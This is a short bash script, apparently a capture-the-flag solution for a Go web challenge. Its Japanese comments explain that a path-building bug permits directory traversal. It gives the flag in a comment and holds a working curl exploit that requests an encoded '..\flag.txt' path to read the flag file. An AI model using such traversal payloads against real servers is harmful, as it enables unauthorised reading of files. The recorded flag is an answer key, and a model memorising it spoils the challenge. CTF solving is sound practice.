#!/bin/bash

# main.go内でファイルパスを組み立てている部分にバグがあり
# ディレクトリトラバーサルができる
# FLAG: WebC{pa7h_p4ckage_hand1e_fil3_p4th_4s_l0gical_p4th_9bfe7b26}
curl https://awebc19.archiso.dev/problems/go_mikuji/..%5cflag.txt | grep --color=auto "WebC{.*}"
